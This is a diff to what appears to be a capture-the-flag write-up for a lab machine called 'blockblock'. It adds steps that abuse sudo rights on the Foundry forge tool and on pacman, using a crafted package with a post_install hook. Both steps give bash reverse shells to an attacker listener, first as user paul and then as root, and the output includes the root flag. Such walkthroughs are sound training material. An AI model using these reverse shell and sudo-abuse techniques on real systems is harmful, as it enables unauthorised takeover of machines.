@@ -1174,7 +1174,7 @@ User keira may run the following commands on blockblock:
 Prepare bash script to connect reverse shell to Kali:
 
 ```sh
-cat << EOF > /tmp/forge
+cat << EOF > /dev/shm/solc
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.44/4444 0>&1
 EOF
@@ -1183,13 +1183,13 @@ EOF
 Setup permission to allow anyone to run the script:
 
 ```sh
-chmod 777 /tmp/forge
+chmod 777 /dev/shm/solc
 ```
 
-Put `/tmp` in `$PATH`
+Create forge project directory and `cd` into it
 
 ```sh
-export PATH=/tmp:$PATH
+mkdir /dev/shm/exploit && cd $_
 ```
 
 Start listener on Kali:
@@ -1198,6 +1198,119 @@ Start listener on Kali:
 rlwrap nc -nlvp 4444
 ```
 
+Use the `sudo` rights to "build" the contract, pointing it to the exploit script
+
 ```sh
-sudo -u paul /home/paul/.foundry/bin/forge completions bash
+sudo -u paul /home/paul/.foundry/bin/forge build --use ../solc
+```
+
+Reverse shell hooked:
+
+```console
+connect to [10.10.14.44] from (UNKNOWN) [10.10.11.43] 54576
+[paul@blockblock exploit]$ cd ~
+[paul@blockblock ~]$ id
+uid=1001(paul) gid=1001(paul) groups=1001(paul)
+```
+
+### 6.  Privilege Escalation
+
+Listing `paul`'s `sudo` rights reveals he can run `/usr/bin/pacman` as `root` without password
+
+```console
+[paul@blockblock ~]$ sudo -l
+User paul may run the following commands on blockblock:
+    (ALL : ALL) NOPASSWD: /usr/bin/pacman
+```
+
+Pacman is a simple library-based package manager for Arch Linux: https://pacman.archlinux.page/
+
+It should be able to use the `--upgrade` operation to get a reverse shell as `root`: https://man.archlinux.org/man/pacman.8.en
+
+Create and make an exploit package:
+
+```console
+[paul@blockblock ~]$ mkdir /dev/shm/exp && cd $_
+[paul@blockblock exp]$ cat << EOF > PKGBUILD
+pkgname=exp
+pkgver=1.0
+pkgrel=1
+arch=('any')
+pkgdesc="Root Reverse Shell"
+license=('GPL')
+install=exp.install
+EOF
+[paul@blockblock exp]$ cat << EOF> exp.install
+post_install(){
+  bash -i >& /dev/tcp/10.10.14.44/4445 0>&1
+}
+EOF
+[paul@blockblock exp]$ makepkg -f
+==> Making package: exp 1.0-1 (Wed 08 Jan 2025 01:07:39 AM UTC)
+==> Checking runtime dependencies...
+==> Checking buildtime dependencies...
+==> Retrieving sources...
+==> Extracting sources...
+==> Entering fakeroot environment...
+==> Tidying install...
+  -> Removing libtool files...
+  -> Purging unwanted files...
+  -> Removing static library files...
+  -> Stripping unneeded symbols from binaries and libraries...
+  -> Compressing man and info pages...
+==> Checking for packaging issues...
+==> Creating package "exp"...
+  -> Generating .PKGINFO file...
+  -> Generating .BUILDINFO file...
+  -> Adding install file...
+  -> Generating .MTREE file...
+  -> Compressing package...
+==> Leaving fakeroot environment.
+==> Finished making: exp 1.0-1 (Wed 08 Jan 2025 01:07:40 AM UTC)
+[paul@blockblock exp]$ ls -l
+total 12
+-rw-r--r-- 1 paul paul 4009 Jan  8 01:07 exp-1.0-1-any.pkg.tar.zst
+-rw-r--r-- 1 paul paul   61 Jan  8 01:07 exp.install
+drwxr-xr-x 4 paul paul   80 Jan  8 01:07 pkg
+-rw-r--r-- 1 paul paul  110 Jan  8 01:07 PKGBUILD
+drwxr-xr-x 2 paul paul   40 Jan  8 01:07 src
+```
+
+Start listener on Kali:
+
+```sh
+rlwrap nc -nlvp 4445
+```
+
+Run `pacman` with `sudo`:
+
+```sh
+[paul@blockblock exp]$ sudo /usr/bin/pacman -U exp-1.0-1-any.pkg.tar.zst
+loading packages...
+resolving dependencies...
+looking for conflicting packages...
+
+Packages (1) exp-1.0-1
+
+
+:: Proceed with installation? [Y/n] Y
+Y
+checking keyring...
+checking package integrity...
+loading package files...
+checking for file conflicts...
+checking available disk space...
+:: Processing package changes...
+installing exp...
+```
+
+Reverse shell hooked:
+
+```console
+connect to [10.10.14.44] from (UNKNOWN) [10.10.11.43] 45416
+[root@blockblock /]# id
+uid=0(root) gid=0(root) groups=0(root)
+[root@blockblock /]# cd ~
+[root@blockblock ~]# cat root.txt
+2e6241771c4c2c54ae8970c35001ae17
 ```
